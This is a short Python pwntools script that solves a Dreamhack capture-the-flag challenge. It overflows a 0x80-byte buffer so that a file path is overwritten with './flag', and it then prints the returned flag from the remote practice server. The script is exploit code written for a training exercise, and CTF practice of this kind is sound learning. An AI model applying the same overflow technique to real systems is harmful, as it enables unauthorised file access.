from pwn import *

# Append 0x80 bytes, 8 bytes for file path.
# Use relative path for minimal path length

sh = remote("host3.dreamhack.games", 12794)

sh.recvuntil(b"?")
sh.sendline(b"." * 0x80 + b"./flag")

print(sh.recvregex(regex=b"DH{.*}").decode())